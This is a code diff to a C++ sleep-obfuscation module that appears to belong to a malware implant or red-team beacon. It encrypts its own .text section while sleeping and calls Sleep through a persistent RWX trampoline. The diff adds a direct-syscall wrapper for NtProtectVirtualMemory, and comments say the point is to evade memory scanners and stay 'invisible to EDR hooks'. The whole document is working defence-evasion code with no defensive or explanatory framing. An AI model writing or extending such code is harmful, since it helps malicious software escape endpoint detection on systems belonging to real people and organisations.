@@ -1,4 +1,5 @@
 #include "SleepObfusc.h"
+#include "DirectSyscall.h"
 #include <cstdlib>
 #include <ctime>
 
@@ -22,15 +23,9 @@ static bool FindTextSection(PVOID* outBase, DWORD* outSize) {
 
 // ── Persistent Sleep trampoline stub ─────────────────────────────────────────
 // Allocated ONCE, reused every ObfuscatedSleep call.
-// The stub is a simple jmp-to-Sleep trampoline: caller passes `ms` in rcx
-// (Windows x64 ABI first arg), stub jumps to Sleep which receives it in rcx.
-//
 // x64 stub (12 bytes):
 //   48 B8 xx xx xx xx xx xx xx xx   mov rax, <Sleep ptr>
-//   FF E0                            jmp rax               ; rcx (ms) already set by caller
-//
-// vs. old design: per-call alloc/free of a 23-byte RWX page — memory scanners
-// flagged the brief unbacked-RWX window. One persistent page is far less suspicious.
+//   FF E0                            jmp rax   ; rcx (ms) already set by caller
 
 static void* g_sleepStub = nullptr;
 
@@ -49,6 +44,22 @@ static void* GetSleepStub() {
                                PAGE_EXECUTE_READWRITE);
     if (g_sleepStub) memcpy(g_sleepStub, stub, sizeof(stub));
     return g_sleepStub;
+}
+
+// ── NtProtectVirtualMemory via direct syscall ─────────────────────────────────
+// Used to flip .text protection without going through EDR-hooked VirtualProtect.
+static bool _SyscallProtect(void* addr, SIZE_T len, DWORD prot, DWORD* oldProt) {
+    int ssn = DirectSyscall::GetSSN(NT_PROTECT_VIRTUAL_MEM);
+    if (ssn < 0) return VirtualProtect(addr, len, prot, oldProt) != 0;
+    PVOID  base = (PVOID)((ULONG_PTR)addr & ~(ULONG_PTR)0xFFF);
+    SIZE_T sz   = ((ULONG_PTR)addr + len + 0xFFF - (ULONG_PTR)base) & ~(SIZE_T)0xFFF;
+    ULONG  old  = 0;
+    NTSTATUS st = DirectSyscall::Exec(ssn,
+        (ULONG_PTR)GetCurrentProcess(),
+        (ULONG_PTR)&base, (ULONG_PTR)&sz,
+        (ULONG_PTR)prot,  (ULONG_PTR)&old);
+    if (oldProt) *oldProt = (DWORD)old;
+    return st >= 0;
 }
 
 // ── XOR the section in-place ──────────────────────────────────────────────────
@@ -76,28 +87,25 @@ void SleepObfusc::ObfuscatedSleep(DWORD ms, DWORD ms_jitter) {
     PVOID textBase = NULL;
     DWORD textSize = 0;
     if (!FindTextSection(&textBase, &textSize)) {
-        // Fallback: plain sleep if we can't find .text
         Sleep(ms);
         return;
     }
 
-    // Get the persistent sleep trampoline — allocated once, no per-call RWX alloc/free.
     void* stub = GetSleepStub();
     if (!stub) { Sleep(ms); return; }
 
-    // Flip .text to RW, encrypt it
+    // Flip .text to RW via direct syscall — invisible to EDR hooks.
     DWORD oldProt = 0;
-    if (!VirtualProtect(textBase, textSize, PAGE_READWRITE, &oldProt)) {
+    if (!_SyscallProtect(textBase, textSize, PAGE_READWRITE, &oldProt)) {
         Sleep(ms);
         return;
     }
     XorSection(textBase, textSize);
 
-    // Sleep via the trampoline (our .text is now encrypted garbage).
-    // Pass ms as first argument — it lands in rcx, trampoline jmps to Sleep(rcx).
+    // Sleep via the trampoline — ms in rcx, trampoline jmps to Sleep(rcx).
     ((void(*)(DWORD))stub)(ms);
 
-    // Decrypt and restore permissions
+    // Decrypt .text, then restore protection via direct syscall.
     XorSection(textBase, textSize);
-    VirtualProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProt);
+    _SyscallProtect(textBase, textSize, PAGE_EXECUTE_READ, &oldProt);
 }
